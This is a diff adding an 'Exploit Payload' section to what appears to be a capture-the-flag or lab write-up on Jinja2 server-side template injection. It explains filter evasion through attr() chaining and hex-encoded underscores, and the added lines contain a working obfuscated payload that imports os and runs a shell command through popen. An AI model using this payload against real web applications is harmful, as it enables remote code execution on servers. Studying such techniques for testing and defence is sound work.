@@ -25,6 +25,11 @@ is probably filter block us from execute code
 To bypass these restrictions in Jinja2, we use two techniques:
 1. Using filters instead of periods: Instead of writing object.attribute, we use Jinja2 filters such as object|attr("attribute").
 2. Using hexadecimal encoding for underscores: To prevent detection of blocked words like __globals__, we write the underscore (_) in its hexadecimal encoding, which is \x5f. Therefore, __globals__ becomes:
+# Exploit Payload
+After understanding the strategy, we will move on to the encoding Payload and we get this:
+  
+{{ request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('ls')|attr('read')() }}
+
 
 
 
